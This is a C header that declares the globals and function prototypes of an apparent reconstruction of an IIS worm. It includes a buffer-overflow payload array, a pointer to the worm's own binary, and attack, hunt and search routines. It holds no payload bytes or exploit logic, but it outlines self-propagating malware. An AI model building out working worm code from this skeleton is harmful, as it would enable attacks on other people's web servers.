#ifndef DATA_GLOBALS_H
#define DATA_GLOBALS_H

#include <stdint.h>
#include <stdbool.h>
#include <winsock2.h>
#include <windows.h>

/* ------------------------------------------------------------------
   Constants
   ------------------------------------------------------------------ */
#define SPLOIT_SIZE 1184   /* size of the buffer‑overflow payload */

/* ------------------------------------------------------------------
   Global variables as in the original IISWorm.c
   ------------------------------------------------------------------ */
extern char *_mybytes;               // will point to the worm's own binary
extern unsigned long _sizemybytes;   // size of that binary
extern unsigned char _sploit[SPLOIT_SIZE];  // the buffer‑overflow payload

/* ------------------------------------------------------------------
   Function prototypes (matching the original names and signatures)
   ------------------------------------------------------------------ */
int   main(int argc, char **argv, char **env);
void  attack(char *hostname);
DWORD WINAPI doweb(LPVOID param);
DWORD WINAPI hunt(LPVOID param);
void  search(LPCSTR param_1);
void  setuphostname(void);

#endif /* DATA_GLOBALS_H */
